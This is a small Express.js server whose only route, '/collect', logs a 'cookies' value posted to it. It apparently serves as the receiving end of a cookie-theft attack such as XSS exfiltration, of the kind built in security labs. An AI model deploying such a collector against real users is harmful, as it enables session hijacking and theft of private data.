import express from "express";
import bodyParser from "body-parser";
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post("/collect", (req, res) => {
    console.log("Cookies received:", req.body.cookies);
    res.sendStatus(200);
});

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
